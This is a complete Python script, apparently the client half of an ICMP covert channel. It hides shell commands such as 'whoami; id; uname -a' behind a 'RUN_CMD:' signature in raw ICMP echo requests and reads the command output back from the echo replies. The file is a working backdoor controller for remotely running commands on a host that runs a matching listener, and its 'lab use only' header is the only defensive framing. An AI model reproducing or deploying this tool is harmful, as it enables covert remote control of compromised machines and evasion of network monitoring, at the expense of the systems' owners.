#!/usr/bin/env python3
"""
ICMP Command Sender (client) — LAB/RESEARCH USE ONLY

Sends commands hidden in ICMP echo request payload.
Waits for command output in matching ICMP echo reply.

Usage:
    sudo python3 icmp_sender.py 192.168.56.101 "whoami; id; uname -a"
"""

import socket
import struct
import sys
import select
import time
import os

# ────────────────────────────────────────────────
SIGNATURE         = b"RUN_CMD:"      # Must match the listener
ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLY   = 0
DEFAULT_TIMEOUT   = 8.0              # seconds
MAX_RECV          = 16384            # many systems drop > 8–16 kB ICMP
RECV_CHUNK        = 8192
# ────────────────────────────────────────────────

def icmp_checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i + 1]
    s = (s >> 16) + (s & 0xffff)
    s += (s >> 16)
    return (~s) & 0xffff


def build_icmp_echo_request(ident: int, seq: int, payload: bytes) -> bytes:
    header = struct.pack("!BBHHH", ICMP_ECHO_REQUEST, 0, 0, ident, seq)
    packet = header + payload
    chksum = icmp_checksum(packet)
    header = struct.pack("!BBHHH", ICMP_ECHO_REQUEST, 0, chksum, ident, seq)
    return header + payload


def receive_reply(sock, expected_ident: int, expected_seq: int, timeout: float):
    start = time.monotonic()
    buf = bytearray()

    while time.monotonic() - start < timeout:
        rlist, _, _ = select.select([sock], [], [], 1.0)
        if not rlist:
            continue

        try:
            packet, (src_ip, _) = sock.recvfrom(MAX_RECV)
        except BlockingIOError:
            continue
        except Exception as e:
            print(f"[recv error] {e}")
            return None, None

        if len(packet) < 28:  # min IPv4 + ICMP header
            continue

        ip_hlen = (packet[0] & 0x0F) * 4
        if len(packet) < ip_hlen + 8:
            continue

        icmp = packet[ip_hlen:ip_hlen+8]
        typ, code, _, ident, seq = struct.unpack("!BBHHH", icmp)

        if typ != ICMP_ECHO_REPLY:
            continue
        if ident != expected_ident or seq != expected_seq:
            continue

        # This is our reply
        payload = packet[ip_hlen + 8:]
        return payload, src_ip

    return None, None


def send_command(target: str, command: str, timeout: float = DEFAULT_TIMEOUT):
    if os.geteuid() != 0:
        print("[!] This script must run as root (sudo)", file=sys.stderr)
        sys.exit(1)

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2*1024*1024)
    except Exception as e:
        print(f"[!] Failed to create raw socket: {e}", file=sys.stderr)
        sys.exit(1)

    ident = 0xBEEF              # easily recognizable
    seq   = int(time.time()) % 65536

    payload = SIGNATURE + command.strip().encode("utf-8", errors="replace")
    if len(payload) > 1400:
        print(f"[!] Warning: payload is {len(payload)} bytes — may be dropped/fragmented")

    request = build_icmp_echo_request(ident, seq, payload)

    print(f"[>] Sending to {target}  |  cmd: {command!r}")
    print(f"[>] payload size: {len(payload)} bytes")

    try:
        sock.sendto(request, (target, 0))
    except Exception as e:
        print(f"[!] sendto failed: {e}")
        sock.close()
        return

    print("[*] Waiting for reply...")

    result, src = receive_reply(sock, ident, seq, timeout)

    sock.close()

    if result is None:
        print("[!] No matching ICMP reply received within timeout.")
        return

    print(f"\n[✓] Reply from {src}")
    print("─" * 60)
    try:
        print(result.decode("utf-8", errors="replace"))
    except:
        print("[binary or malformed data]")
        print(result.hex(" ", -1))
    print("─" * 60)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage:   sudo {sys.argv[0]} <target_ip> \"command here\"")
        print("Example: sudo {sys.argv[0]} 192.168.1.55 \"whoami ; id ; pwd ; cat /etc/hostname\"")
        sys.exit(1)

    target_ip = sys.argv[1]
    command   = sys.argv[2]

    send_command(target_ip, command)
